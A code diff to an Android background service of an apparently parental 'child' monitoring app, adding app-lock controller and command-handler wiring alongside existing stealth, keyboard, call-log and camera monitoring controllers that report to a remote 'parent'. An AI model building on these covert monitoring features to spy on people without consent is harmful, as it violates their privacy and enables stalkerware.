@@ -14,6 +14,8 @@ import android.os.IBinder
 import android.util.Log
 import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
+import com.nexus.child.components.applock.AppLockCommandHandler
+import com.nexus.child.components.applock.AppLockController
 import com.nexus.child.components.calllog.CallLogCommandHandler
 import com.nexus.child.components.calllog.CallLogController
 import com.nexus.child.components.camera.CameraController
@@ -188,6 +190,8 @@ class NexusBackgroundService : Service() {
     private var keyboardCommandHandler: KeyboardCommandHandler? = null
     private var stealthController: StealthController? = null
     private var stealthCommandHandler: StealthCommandHandler? = null
+    private var appLockController: AppLockController? = null
+    private var appLockCommandHandler: AppLockCommandHandler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -579,7 +583,19 @@ class NexusBackgroundService : Service() {
             Log.d(TAG, "Global stealth listener dispatched to parent: $statusMsg")
         }
 
-        Log.d(TAG, "All 12 hardware monitoring controllers successfully initialized in background")
+        // App Lock Security & Remote Overrides
+        val alCtrl = AppLockController(
+            context = this,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+        appLockController = alCtrl
+        appLockCommandHandler = AppLockCommandHandler(
+            context = this,
+            controller = alCtrl,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+
+        Log.d(TAG, "All 13 hardware monitoring controllers successfully initialized in background")
     }
 
     /**
@@ -597,7 +613,8 @@ class NexusBackgroundService : Service() {
                 notificationCommandHandler?.handleCommand(command) == true ||
                 screenCommandHandler?.handleCommand(command) == true ||
                 keyboardCommandHandler?.handleCommand(command) == true ||
-                stealthCommandHandler?.handleCommand(command) == true
+                stealthCommandHandler?.handleCommand(command) == true ||
+                appLockCommandHandler?.handleCommand(command) == true
 
         if (!handled) {
             Log.d(TAG, "Unhandled command ignored: $command")
@@ -619,12 +636,15 @@ class NexusBackgroundService : Service() {
         notificationCommandHandler?.onPeerDisconnected()
         screenCommandHandler?.onPeerDisconnected()
         keyboardCommandHandler?.onPeerDisconnected()
+        appLockCommandHandler?.onPeerDisconnected()
     }
 
     /**
      * Tears down all active resources when the service is stopped.
      */
     private fun cleanupEngine() {
+        appLockCommandHandler?.cleanup()
+        appLockController?.cleanup()
         keyboardCommandHandler?.cleanup()
         keyboardController?.cleanup()
         stealthCommandHandler?.cleanup()
